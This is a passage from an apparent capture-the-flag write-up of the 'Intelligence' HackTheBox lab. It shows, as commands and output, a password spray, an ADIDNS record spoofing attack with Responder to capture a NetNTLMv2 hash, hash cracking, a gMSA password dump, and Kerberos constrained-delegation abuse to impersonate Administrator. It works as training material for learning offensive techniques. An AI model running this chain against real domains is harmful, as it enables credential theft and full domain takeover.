SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         dc.intelligence.htb 445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
```
- But no `winrm`
```
└─$ crackmapexec winrm dc.intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --continue-on-success
SMB         dc.intelligence.htb 5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
HTTP        dc.intelligence.htb 5985   DC               [*] http://dc.intelligence.htb:5985/wsman
WINRM       dc.intelligence.htb 5985   DC               [-] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

## User
- `smb`
```
└─$ smbclient -L //dc.intelligence.htb -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to dc.intelligence.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- Let's check `IT` and `Users`
```
└─$ smbclient //dc.intelligence.htb/Users -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Mon Apr 19 02:20:26 2021
  ..                                 DR        0  Mon Apr 19 02:20:26 2021
  Administrator                       D        0  Mon Apr 19 01:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 08:21:46 2018
  Default                           DHR        0  Mon Apr 19 03:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 08:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 08:11:27 2018
  Public                             DR        0  Mon Apr 19 01:18:39 2021
  Ted.Graves                          D        0  Mon Apr 19 02:20:26 2021
  Tiffany.Molina                      D        0  Mon Apr 19 01:51:46 2021

                3770367 blocks of size 4096. 1462131 blocks available
smb: \> cd Tiffany.Molina
smb: \Tiffany.Molina\> ls
  .                                   D        0  Mon Apr 19 01:51:46 2021
  ..                                  D        0  Mon Apr 19 01:51:46 2021
  AppData                            DH        0  Mon Apr 19 01:51:46 2021
  Application Data                DHSrn        0  Mon Apr 19 01:51:46 2021
  Cookies                         DHSrn        0  Mon Apr 19 01:51:46 2021
  Desktop                            DR        0  Mon Apr 19 01:51:46 2021
  Documents                          DR        0  Mon Apr 19 01:51:46 2021
  Downloads                          DR        0  Sat Sep 15 08:12:33 2018
  Favorites                          DR        0  Sat Sep 15 08:12:33 2018
  Links                              DR        0  Sat Sep 15 08:12:33 2018
  Local Settings                  DHSrn        0  Mon Apr 19 01:51:46 2021
  Music                              DR        0  Sat Sep 15 08:12:33 2018
  My Documents                    DHSrn        0  Mon Apr 19 01:51:46 2021
  NetHood                         DHSrn        0  Mon Apr 19 01:51:46 2021
  NTUSER.DAT                        AHn   131072  Thu Sep  7 00:15:25 2023
  ntuser.dat.LOG1                   AHS    86016  Mon Apr 19 01:51:46 2021
  ntuser.dat.LOG2                   AHS        0  Mon Apr 19 01:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf    AHS    65536  Mon Apr 19 01:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Mon Apr 19 01:51:46 2021
  NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Mon Apr 19 01:51:46 2021
  ntuser.ini                        AHS       20  Mon Apr 19 01:51:46 2021
  Pictures                           DR        0  Sat Sep 15 08:12:33 2018
  Recent                          DHSrn        0  Mon Apr 19 01:51:46 2021
  Saved Games                         D        0  Sat Sep 15 08:12:33 2018
  SendTo                          DHSrn        0  Mon Apr 19 01:51:46 2021
  Start Menu                      DHSrn        0  Mon Apr 19 01:51:46 2021
  Templates                       DHSrn        0  Mon Apr 19 01:51:46 2021
  Videos                             DR        0  Sat Sep 15 08:12:33 2018

                3770367 blocks of size 4096. 1462131 blocks available
smb: \Tiffany.Molina\> cd Desktop
smb: \Tiffany.Molina\Desktop\> ls
  .                                  DR        0  Mon Apr 19 01:51:46 2021
  ..                                 DR        0  Mon Apr 19 01:51:46 2021
  user.txt                           AR       34  Thu Sep  7 00:05:56 2023

                3770367 blocks of size 4096. 1462131 blocks available
```
```
└─$ smbclient //dc.intelligence.htb/IT -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 19 01:50:55 2021
  ..                                  D        0  Mon Apr 19 01:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 01:50:55 2021

                3770367 blocks of size 4096. 1462131 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
```
- `downdetector.ps1`
  - It checks `AD` for records with `web` prefix and performs `curl` to test if they are online using credentials
```
└─$ cat downdetector.ps1                                                                                           
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
    $request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
    if(.StatusCode -ne 200) {
      Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
    }
  } catch {}
}
```
- We could also run `bloodhound`, but this script implies we have attack this path
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-integrated-dns
  - https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing
  - We need [krbrelayx](https://github.com/dirkjanm/krbrelayx)
    - `dnstool.py`
  - And `responder`
```
└─$ sudo responder -I tun0         
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
...
```

- Let`s try adding new `A` record
```
└─$ python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' 10.10.10.248 -a add -r web1 -d 10.10.16.9 -t A
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```
- Now we wait

![](./images/2.png)

- Let's crack the hash
```
└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
...

TED.GRAVES::intelligence:fc4f3dea61817ebd:8e26af6a7227930138b5c644cfff4ab7:01010000000000009bb92c7a29e1d901862fca5d1a9792780000000002000800420048004b00570001001e00570049004e002d003000580047004f004f005a0052004c00430056005a0004001400420048004b0057002e004c004f00430041004c0003003400570049004e002d003000580047004f004f005a0052004c00430056005a002e00420048004b0057002e004c004f00430041004c0005001400420048004b0057002e004c004f00430041004c000800300030000000000000000000000000200000c10dab08ac787c3f5e7104c83c4a6301a82c1a9491d8346d8d7f6b8d8ef337500a001000000000000000000000000000000000000900340048005400540050002f0077006500620031002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: TED.GRAVES::intelligence:fc4f3dea61817ebd:8e26af6a7...000000
Time.Started.....: Wed Sep  6 19:22:15 2023 (10 secs)
Time.Estimated...: Wed Sep  6 19:22:25 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1096.4 kH/s (0.47ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10814464/14344385 (75.39%)
Rejected.........: 0/10814464 (0.00%)
Restore.Point....: 10813952/14344385 (75.39%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Mrs B -> Mr.Brownstone
Hardware.Mon.#1..: Util: 90%

Started: Wed Sep  6 19:22:15 2023
Stopped: Wed Sep  6 19:22:26 2023
```

- And it works
```
└─$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy                    
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy
```
## Root
- Now we can check `bloodhound`
  - `bloodhound-python -c all -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248 --zip`

![](./images/3.png)

![](./images/4.png)


- We have a `ReadGMSAPassword` rights over `svc_int` which has delegation to `dc.intelligence.htb`
  - [Group managed service accounts (gMSAs)](https://learn.microsoft.com/en-us/azure/active-directory/architecture/service-accounts-group-managed)
    - `gMSAs can run on one server, or in a server farm, such as systems behind a network load balancing or Internet Information Services (IIS) server. After you configure your services to use a gMSA principal, account password management is handled by the Windows operating system (OS)`
  - https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword
  - Let's get the `hash` using [gMSADumper](https://github.com/micahvandeusen/gMSADumper)
```
└─$ python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d intelligence.htb -l 10.10.10.248
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::ff3418066942aa8bd228ea17dc71999a
svc_int$:aes256-cts-hmac-sha1-96:30844881b57965c3a115cafa00eb0935928ff0af889f3818e0bc1ccf50c0cbfb
svc_int$:aes128-cts-hmac-sha1-96:327f8f8594183dfe4f430986556147b2
```

- Now we can attack [Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
  - If an attacker has compromised a service account with constrained delegation, they can relay received authentication attempts to one or more SPNs in the list.
    - If we compromise an account with constrained delegation, we can delegate the authentication to ```any service``` offered by the account in the authorized list
    - If this constrained delegation allows ```protocol transition```, we can pretend to be anyone, arbitrarily, to authenticate against these services.
  - https://www.onsecurity.io/blog/abusing-kerberos-from-linux/
  - https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained

```
└─$ impacket-getST -spn 'www/dc.intelligence.htb' -dc-ip 10.10.10.248 -hashes ':ff3418066942aa8bd228ea17dc71999a' -impersonate Administrator 'intelligence.htb/svc_int'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

- We need to `sync` with `Domain Controller`
  - We can do it using `ntpdate` which sync time with `NTP server`
```
└─$ sudo service virtualbox-guest-utils stop
└─$ sudo ntpdate 10.10.10.248
[sudo] password for kali: 
2023-09-07 02:55:40.735325 (+0100) +25164.221617 +/- 0.046405 10.10.10.248 s1 no-leap
```
- Now we can get the ticket
```
└─$ impacket-getST -spn 'www/dc.intelligence.htb' -dc-ip 10.10.10.248 -hashes ':ff3418066942aa8bd228ea17dc71999a' -impersonate Administrator 'intelligence.htb/svc_int'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

- Now export the ticket and connect with `psexec` or `wmiexec`
```
└─$ export KRB5CCNAME=./Administrator.ccache
```

![](./images/5.png)